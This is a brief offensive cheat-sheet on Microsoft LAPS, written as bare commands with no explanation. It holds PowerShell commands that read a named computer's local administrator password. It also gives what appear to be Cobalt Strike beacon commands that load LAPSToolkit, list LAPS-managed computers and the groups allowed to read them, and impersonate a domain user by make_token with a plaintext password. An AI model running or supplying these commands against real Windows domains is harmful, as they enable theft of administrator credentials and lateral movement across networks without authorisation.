### Local Administrator Password Solution
```
PowerShell Get-Command *AdmPwd*
PowerShell Get-AdmPwdPassword -ComputerName Alice_PC | fl

```
```
powershell-import C:\Users\Commando\Desktop\LAPSToolkit.ps1
powerpick Get-LAPSComputers
powershell Find-LAPSDelegatedGroups
make_token MeMe 123456qWE
make_token insomnia.io\MeMe 123456qWE
```
